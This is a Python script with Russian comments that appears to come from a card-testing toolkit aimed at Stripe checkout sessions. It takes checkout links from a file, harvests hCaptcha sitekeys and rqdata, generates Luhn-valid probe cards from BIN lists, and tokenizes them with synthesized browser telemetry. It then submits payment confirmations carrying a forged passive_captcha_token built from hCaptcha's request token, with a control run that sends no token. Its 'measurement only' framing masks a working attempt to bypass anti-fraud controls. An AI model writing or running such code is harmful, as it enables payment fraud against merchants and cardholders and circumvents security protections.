# language: Python 3.12+, file: _audit/exp_captcha_token.py, target: Windows 11
"""Эксперимент по капча-токену (только замеры, дефолты проекта не меняются).

Что меряем:
  1) sitekey из link_settings САМОЙ сессии против донорского из wallet-config;
  2) что отдаёт checksiteconfig и отвечает ли getcaptcha (то есть можно ли дойти до
     настоящего токена, а не только до request-токена);
  3) как payment_pages/confirm отвечает на passive_captcha_token с нашим значением —
     и как он же отвечает без него (контроль).

Запуск: python _audit/exp_captcha_token.py <файл со ссылками> [номер строки-контроля]
"""
import asyncio
import json
import sys
import uuid

sys.path.insert(0, "C:/Users/Redmi/Downloads/pusto")

import config  # noqa: E402
import gate_client as gc  # noqa: E402
import hit_gate as hg  # noqa: E402



def exp_card_raw() -> str:
    """Пробник по Луну, генерируется на ходу: полного PAN в исходнике нет (правило гигиены секретов).

    Карта нужна только для проверки поведения маршрута — эмитент её всё равно отклонит без списания.
    """
    import random

    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"


HEADERS = {"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}


def short(v, n=160):
    return json.dumps(v, ensure_ascii=False)[:n] if not isinstance(v, str) else v[:n]


async def session_challenge_data(gs):
    r = await gs.s.get(f"https://api.stripe.com/v1/payment_pages/{gs.cs}", params={"key": gs.pk}, headers=HEADERS, timeout=12)
    d = r.json() or {}
    ls = d.get("link_settings") or {}
    return {"status": r.status_code, "site_key": ls.get("hcaptcha_site_key"), "rqdata_len": len(str(ls.get("hcaptcha_rqdata") or "")), "rqdata": str(ls.get("hcaptcha_rqdata") or "")[:60]}


async def donor_sitekey(gs):
    try:
        r = await gs.s.post("https://merchant-ui-api.stripe.com/elements/wallet-config",
                            data={"stripe_js_id": str(uuid.uuid4()), "referrer_host": "checkout.stripe.com",
                                  "key": gs.pk, "request_surface": "web_split_card_element_popup"},
                            headers={"Origin": "https://js.stripe.com",
                                     "Referer": "https://checkout.stripe.com/my-account/add-payment-method/",
                                     "Accept": "application/json"}, timeout=10)
        key = gc._find_key(r.json(), "link_hcaptcha_site_key")
        return {"status": r.status_code, "site_key": key}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"[:120]}


async def checksiteconfig(gs, sitekey, host):
    if not sitekey:
        return {"error": "нет sitekey"}
    try:
        r = await gs.s.post("https://api.hcaptcha.com/checksiteconfig",
                            params={"v": gc.STRIPE_JS_BUILD, "sitekey": sitekey, "host": host, "sc": "1", "swa": "1"},
                            headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/", "Accept": "application/json"},
                            timeout=10)
        try:
            j = r.json()
        except Exception:
            j = {"raw": r.text[:200]}
        req = j.get("req") if isinstance(j, dict) else None
        return {"status": r.status_code, "keys": sorted(j.keys())[:10] if isinstance(j, dict) else None,
                "req_prefix": (str(req)[:12] if req else None), "req_len": len(str(req)) if req else 0,
                "pass": (j.get("pass") if isinstance(j, dict) else None), "c": short(j.get("c") if isinstance(j, dict) else None, 120)}
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"[:140]}


async def try_getcaptcha(gs, sitekey, host, rqdata):
    out = {}
    try:
        r = await gs.s.post("https://api.hcaptcha.com/getcaptcha",
                            data={"v": gc.STRIPE_JS_BUILD, "sitekey": sitekey, "host": host, "rqdata": rqdata, "sc": "1"},
                            headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/", "Accept": "application/json"},
                            timeout=12)
        out["post"] = {"status": r.status_code, "body": r.text[:300]}
    except Exception as e:
        out["post"] = {"error": f"{type(e).__name__}: {e}"[:120]}
    try:
        r2 = await gs.s.get(f"https://api.hcaptcha.com/getcaptcha/{sitekey}",
                           params={"v": gc.STRIPE_JS_BUILD, "host": host, "rqdata": rqdata, "sc": "1", "swa": "1"},
                           headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/", "Accept": "application/json"},
                           timeout=12)
        out["get"] = {"status": r2.status_code, "body": r2.text[:300]}
    except Exception as e:
        out["get"] = {"error": f"{type(e).__name__}: {e}"[:120]}
    return out


async def tokenize(gs, card_raw):
    card = gc.parse_card(card_raw) if hasattr(gc, "parse_card") else None
    if not card:
        pan, mm, yy, cvc = card_raw.split("|")
        card = {"number": pan, "mm": mm, "yy": yy, "cvc": cvc}
    telem = gs.synthesize_telemetry()
    body = gc.tokenize_body(card, telem, gs.url.split("#")[0])
    res = await gc.tokenize_payment_method(gs.s, body, timeout=12)
    return res.get("id"), telem, res


async def confirm_once(gs, pm_id, token=None, label="confirm"):
    body = {
        "key": gs.pk,
        "eid": str(uuid.uuid4()),
        "payment_method": pm_id,
        "expected_payment_method_type": "card",
        "expected_amount": str(gs.expected_amount or gs.amount),
        "return_url": gs.url.split("#")[0],
    }
    if gs.checksum:
        body["init_checksum"] = gs.checksum
    if token:
        body["passive_captcha_token"] = token
    r = await gs.s.post(f"https://api.stripe.com/v1/payment_pages/{gs.cs}/confirm", data=body, headers=HEADERS, timeout=20)
    try:
        j = r.json()
    except Exception:
        j = {"raw": r.text[:200]}
    err = (j.get("error") or {}) if isinstance(j, dict) else {}
    print(f"  [{label}] http={r.status_code} code={err.get('code')!r} param={err.get('param')!r} msg={str(err.get('message'))[:110]!r}")
    if not err:
        pi = (j.get("payment_intent") or {}) if isinstance(j, dict) else {}
        print(f"  [{label}] pi={pi.get('id')} status={pi.get('status')} next={short(((pi.get('next_action') or {}).get('use_stripe_sdk') or {}), 120)}")
    return r.status_code, j


async def run(url, with_token: bool):
    gs = hg.CsHitSession(url)
    ok, detail = await gs.open()
    print(f"\n=== {url.split('#')[0][-26:]} | open={ok} {detail} | amount={gs.expected_amount or gs.amount}{gs.currency} | checksum={bool(gs.checksum)}")
    if not ok:
        return
    sc = await session_challenge_data(gs)
    print("  сессия: site_key=" + str(sc.get("site_key")) + " rqdata_len=" + str(sc.get("rqdata_len")))
    don = await donor_sitekey(gs)
    print("  донор : " + short(don, 200))
    same = (don.get("site_key") and sc.get("site_key") and don["site_key"] == sc["site_key"])
    print(f"  sitekey сессии и донора совпадают: {bool(same)}")
    for host in ("b.stripecdn.com", "checkout.stripe.com"):
        cfg = await checksiteconfig(gs, sc.get("site_key") or don.get("site_key"), host)
        print(f"  checksiteconfig[{host}] (session key): " + short(cfg, 260))
    if don.get("site_key") and don["site_key"] != sc.get("site_key"):
        cfg2 = await checksiteconfig(gs, don["site_key"], "b.stripecdn.com")
        print("  checksiteconfig[b.stripecdn.com] (donor key): " + short(cfg2, 220))
    gcres = await try_getcaptcha(gs, sc.get("site_key") or "", "b.stripecdn.com", sc.get("rqdata") or "")
    print("  getcaptcha: " + short(gcres, 620))
    pm_id, telem, tokres = await tokenize(gs, exp_card_raw())
    print(f"  tokenize: pm={pm_id} err={short((tokres or {}).get('error'), 90)}")
    if not pm_id:
        return
    cfg_local = await checksiteconfig(gs, sc.get("site_key") or "", "b.stripecdn.com")
    our_req = cfg_local.get("req")
    token = None
    if with_token:
        req_tok = await gs.s.post("https://api.hcaptcha.com/checksiteconfig",
                                  params={"v": gc.STRIPE_JS_BUILD, "sitekey": sc.get("site_key") or "", "host": "b.stripecdn.com", "sc": "1", "swa": "1"},
                                  headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/", "Accept": "application/json"}, timeout=10)
        try:
            req_val = (req_tok.json() or {}).get("req")
        except Exception:
            req_val = None
        token = ("P1_" + str(req_val)) if req_val and not str(req_val).startswith("P1_") else req_val
        print(f"  наш токен: len={len(str(token)) if token else 0} prefix={str(token)[:12]!r}")
        await confirm_once(gs, pm_id, token=token, label="С ТОКЕНОМ")
    else:
        await confirm_once(gs, pm_id, token=None, label="БЕЗ ТОКЕНА (контроль)")
    await gs.close()


async def main():
    links = [l.strip() for l in open(sys.argv[1], encoding="utf-8") if l.strip().startswith("http")]
    for i, link in enumerate(links):
        await run(link, with_token=(i == 0))


asyncio.run(main())